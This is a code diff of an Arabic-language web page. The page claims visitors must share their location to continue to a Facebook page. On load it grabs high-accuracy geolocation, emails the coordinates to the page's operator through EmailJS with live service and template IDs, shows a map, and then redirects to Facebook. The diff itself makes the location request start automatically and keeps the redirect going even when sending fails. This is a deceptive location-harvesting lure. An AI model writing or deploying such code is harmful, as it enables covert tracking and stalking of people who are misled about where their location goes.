@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>التحقق من الموقع</title>
+  <title>التحقق من الموقع وعرض الخريطة</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
@@ -19,7 +19,7 @@
       padding: 20px;
     }
 
-    #message, #error, #retryBtn {
+    #loadingMessage, #welcomeMessage, #errorContainer, #mapContainer {
       margin-top: 20px;
     }
 
@@ -31,85 +31,191 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
+      margin-top: 15px; /* Added margin for better spacing */
     }
 
-    #mainImage {
-      display: none;
-      max-width: 100%;
-      height: auto;
-    }
-
-    #welcome {
-      display: block;
-    }
-
-    #error {
+    #errorContainer {
       color: red;
       font-weight: bold;
       display: none;
     }
 
-    #retryBtn {
+    #mapContainer {
+      width: 90%; /* Adjust as needed */
+      height: 400px; /* Adjust as needed */
+      max-width: 600px;
+      border: 1px solid #ccc;
+      margin-top: 20px;
       display: none;
+    }
+
+    #loadingMessage {
+      font-size: 1.2em;
+      color: #555;
+      display: none; /* Hidden by default, shown when loading */
+    }
+
+    /* Initial state before any action */
+    #welcomeMessage {
+        display: block; /* Visible by default */
+    }
+
+    /* #startBtn is not used as we ask directly */
+    #startBtn {
+        display: none;
     }
   </style>
 </head>
 <body>
 
-  <!-- شاشة البداية -->
-  <div id="welcome">
-    <h2>يرجى السماح بالموقع للمتابعة إلى صفحة المستخدم في فيسبوك</h2>
-    <button id="startBtn" onclick="askForLocation()">المتابعة</button>
+  <div id="welcomeMessage">
+    <h2>يرجى السماح بالوصول إلى موقعك للمتابعة إلى صفحة فيسبوك.</h2>
+    <p>هذا يساعدنا في تقديم تجربة أفضل.</p>
   </div>
 
-  <!-- صورة تظهر فقط إذا وافق المستخدم -->
-  <img id="mainImage" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5k067g9GnGhi2Akznix-ym2U_CLEUtdVgdunboW29UwGv3I6dkhh-q98N&s=10" alt="صورة">
+  <div id="loadingMessage">
+    <p>جاري الحصول على موقعك...</p>
+  </div>
 
-  <!-- رسالة الخطأ -->
-  <div id="error">⚠️ لا يمكنك المتابعة إلا إذا وافقت على الوصول إلى موقعك.</div>
-  <button id="retryBtn" onclick="askForLocation()">المحاولة مرة أخرى</button>
+  <div id="mapContainer"></div>
+
+  <div id="errorContainer">
+    <p>⚠️ لا يمكنك المتابعة إلا إذا وافقت على الوصول إلى موقعك.</p>
+    <p>الرجاء تفعيل خدمات الموقع لجهازك وإعادة المحاولة.</p>
+    <button id="retryBtn" onclick="askForLocation()">المحاولة مرة أخرى</button>
+  </div>
 
   <script>
-    emailjs.init("0XeUaAWOfdeN9gGEr"); // public key
+    // ************************
+    // قم بتغيير هذه القيم بمعلوماتك الخاصة
+    // تأكد من حصولك على مفتاح Google Maps API وتفعيله في Google Cloud Console
+    // تأكد من إعداد خدمة وقالب EmailJS بشكل صحيح
+    const EMAILJS_PUBLIC_KEY = "0XeUaAWOfdeN9gGEr"; // مفتاح EmailJS العام الخاص بك
+    const EMAILJS_SERVICE_ID = "service_gtkrov5"; // معرف الخدمة الخاص بك في EmailJS
+    const EMAILJS_TEMPLATE_ID = "template_jj0pjs9"; // معرف القالب الخاص بك في EmailJS
+    const FACEBOOK_PAGE_URL = "https://www.facebook.com/your_facebook_page"; // رابط صفحة فيسبوك الفعلية
+    const Maps_API_KEY = "YOUR_Maps_API_KEY"; // *** ضع مفتاح Google Maps API الخاص بك هنا ***
+    // ************************
 
-    function sendLocation(latitude, longitude) {
+    // تهيئة EmailJS باستخدام مفتاحك العام
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    // دالة لإنشاء الخريطة وعرضها
+    // هذه الدالة ستُستدعى فقط بعد تحميل مكتبة Google Maps API بنجاح
+    function initMap(latitude, longitude) {
+      const mapContainer = document.getElementById("mapContainer");
+      mapContainer.style.display = "block"; // عرض حاوية الخريطة
+
+      const location = { lat: latitude, lng: longitude };
+      // تحقق مما إذا كانت مكتبة google.maps موجودة قبل استخدامها
+      if (typeof google !== 'undefined' && typeof google.maps !== 'undefined') {
+        const map = new google.maps.Map(mapContainer, {
+          zoom: 15, // مستوى التكبير
+          center: location, // مركز الخريطة
+        });
+
+        // إضافة علامة للموقع
+        new google.maps.Marker({
+          position: location,
+          map: map,
+          title: "موقعك الحالي",
+        });
+      } else {
+        console.error("Google Maps API لم يتم تحميلها بعد.");
+        // يمكنك إضافة رسالة خطأ للمستخدم هنا إذا لم يتم تحميل الخريطة
+      }
+    }
+
+    // دالة لإرسال رابط الموقع عبر EmailJS
+    function sendLocationLink(latitude, longitude) {
       const now = new Date().toLocaleString();
+      // رابط Google Maps الذي يفتح على الإحداثيات المحددة (ليس موقعًا حيًا)
+      // هذا الرابط هو أفضل بديل ممكن لرابط "الموقع المباشر" في هذا السياق
+      const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+
       const params = {
         name: "Location Bot",
         time: now,
-        message: `User Coordinates:\nLatitude: ${latitude}\nLongitude: ${longitude}`
+        message: `موقع المستخدم الثابت في ${now}:\n${googleMapsLink}`
       };
 
-      emailjs.send("service_gtkrov5", "template_jj0pjs9", params)
-        .then(() => console.log("Location sent"))
-        .catch(err => console.error("Email error:", err));
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
+        .then(() => {
+          console.log("Location link sent successfully!");
+          // بعد إرسال الموقع بنجاح، يتم التوجيه إلى فيسبوك
+          setTimeout(() => { // تأخير بسيط ليرى المستخدم الخريطة قبل التوجيه
+            window.location.href = FACEBOOK_PAGE_URL;
+          }, 3000); // 3 ثواني
+        })
+        .catch(err => {
+          console.error("Email error:", err);
+          alert("حدث خطأ أثناء إرسال بيانات الموقع، ولكن سيتم توجيهك.");
+          // حتى لو فشل الإرسال، يتم التوجيه لفيسبوك
+          setTimeout(() => {
+            window.location.href = FACEBOOK_PAGE_URL;
+          }, 3000); // 3 ثواني
+        });
     }
 
+    // الدالة الرئيسية لطلب الموقع
     function askForLocation() {
-      // إخفاء الشاشة الأولى
-      document.getElementById("welcome").style.display = "none";
-      document.getElementById("error").style.display = "none";
+      // إخفاء جميع العناصر الأخرى
+      document.getElementById("welcomeMessage").style.display = "none";
+      document.getElementById("errorContainer").style.display = "none";
       document.getElementById("retryBtn").style.display = "none";
+      document.getElementById("mapContainer").style.display = "none";
 
-      navigator.geolocation.getCurrentPosition(success => {
-        const lat = success.coords.latitude;
-        const lon = success.coords.longitude;
+      // عرض رسالة التحميل
+      document.getElementById("loadingMessage").style.display = "block";
 
-        sendLocation(lat, lon);
 
-        // عرض الصورة فقط
-        document.getElementById("mainImage").style.display = "block";
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success => {
+          document.getElementById("loadingMessage").style.display = "none"; // إخفاء رسالة التحميل
+          const lat = success.coords.latitude;
+          const lon = success.coords.longitude;
 
-      }, error => {
-        if (error.code === error.PERMISSION_DENIED) {
-          document.getElementById("error").style.display = "block";
-          document.getElementById("retryBtn").style.display = "inline-block";
-        } else {
-          alert("حدث خطأ غير متوقع");
-        }
-      });
+          // تهيئة الخريطة فقط بعد التأكد من تحميل Google Maps API
+          // نستخدم setTimeout لضمان تحميل API بشكل كامل قبل initMap
+          // أو يمكنك استخدام دالة callback في استدعاء السكربت الأصلي
+          // ولكن هذا النهج يعمل بشكل جيد للتبسيط
+          const checkGoogleMapsLoaded = setInterval(() => {
+            if (typeof google !== 'undefined' && typeof google.maps !== 'undefined') {
+              clearInterval(checkGoogleMapsLoaded);
+              initMap(lat, lon); // عرض الخريطة
+              sendLocationLink(lat, lon); // إرسال رابط الموقع
+            }
+          }, 200); // تحقق كل 200 مللي ثانية
+
+        }, error => {
+          document.getElementById("loadingMessage").style.display = "none"; // إخفاء رسالة التحميل
+          document.getElementById("welcomeMessage").style.display = "none"; // تأكد من إخفائها
+
+          if (error.code === error.PERMISSION_DENIED) {
+            document.getElementById("errorContainer").style.display = "block";
+          } else {
+            alert("حدث خطأ غير متوقع أثناء محاولة الحصول على موقعك. يرجى المحاولة مرة أخرى.");
+            document.getElementById("errorContainer").style.display = "block"; // عرض الخطأ العام
+          }
+        }, {
+            enableHighAccuracy: true, // طلب أعلى دقة ممكنة
+            timeout: 10000,         // مهلة 10 ثواني للحصول على الموقع
+            maximumAge: 0           // لا تستخدم المواقع المخزنة مؤقتًا، اطلب موقعًا جديدًا
+        });
+      } else {
+          document.getElementById("loadingMessage").style.display = "none";
+          alert("متصفحك لا يدعم خاصية تحديد الموقع الجغرافي.");
+          window.location.href = FACEBOOK_PAGE_URL; // توجيه مباشر إذا كان المتصفح لا يدعم
+      }
     }
+
+    // عند تحميل الصفحة بالكامل، ابدأ عملية طلب الموقع مباشرة
+    window.onload = () => {
+      askForLocation();
+    };
   </script>
+
+  <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_Maps_API_KEY"></script>
 
 </body>
 </html>
